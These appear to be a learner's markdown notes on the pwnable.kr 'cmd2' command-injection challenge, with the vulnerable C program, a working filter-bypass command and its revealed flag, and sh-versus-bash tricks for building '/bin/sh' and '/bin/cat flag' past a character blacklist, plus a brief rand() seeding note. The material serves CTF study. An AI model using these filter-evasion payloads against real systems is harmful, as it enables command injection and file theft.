---
sort : 1
---


# Bash & Sh

```
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```


EX ::
	* if any of {"=", "PATH", "export", "/", "`", "flag"} in command  --> exit(0)
	* All environment varibales are deleted 
	* PATH=/no_command_execution_until_you_become_a_hacker
	* system(argv[1])


https://n1ght-w0lf.github.io/binary%20exploitation/cmd2/

https://github.com/victor-li/pwnable.kr-write-ups/blob/master/cmd2.md

https://medium.com/@clong/pwnable-kr-cmd1-cmd2-writeups-e6980fa8daca





```
$ ./cmd2 “command -p cat \”f\”\”l\”\”a\”\”g\””
command -p cat “f””l””a””g”
FuN_w1th_5h3ll_v4riabl3s_haha
```













## sh vs. bash 

bash is sh, but with more features and better syntax.

`sh` is implemented by programs like `dash`, `kash`, and original `Bourne Shell`


```note
It is not possible to use `echo` portably across all POSIX systems unless both -n (as the first argument) and escape sequences are omitted. The `printf` utility can be used portably to emulate any of the traditional behaviors of the echo
```


> Ex

sh : 
```sh 
$ echo $'\x2f\x62\x69\x6e\x2f\x73\x68'
#	\x2f\x62\x69\x6e\x2f\x73\x68

$ echo -e \\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68
#	-e \x2f\x62\x69\x6e\x2f\x73\x68

$ printf "%b" '\x2f\x62\x69\x6e\x2f\x73\x68'
#	\x2f\x62\x69\x6e\x2f\x73\x68
```

bash :
```bash
$ echo $'\x2f\x62\x69\x6e\x2f\x73\x68'
#	/bin/sh

$ echo -e \\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68
#	/bin/sh

$ printf "%b" '\x2f\x62\x69\x6e\x2f\x73\x68'
#	/bin/sh
```

```tip
some times using echo in some OS command injection attacks - through for example `system()` function in C - won't work !! 

because system() forks a new process and run the passed command inside `sh` environment, `execl("/bin/sh", "sh", "-c", command, (char *) NULL);`
```

sh :
```sh              
$ printf "%bbin%bcat %s%s" "\57" "\57" "fl" "ag"
#	/bin/cat flag$														finally !! 
```

bash :
```bash
printf "%bbin%bcat %s%s" "\57" "\57" "fl" "ag"
#	\57bin\57cat flag                                                                                                                    
```
















# rand()

The `rand()` function returns a `pseudo-random` integer in the range `0` to `RAND_MAX` inclusive (i.e., the mathematical range [0, RAND_MAX]).

The `srand()` function sets its argument as the `seed` for a new `sequence` of pseudo-random integers to be returned by `rand()`.  These sequences are `repeatable` by calling srand() with the same seed value.

If `no seed value is provided`, the rand() function is automatically seeded with a value of `1`.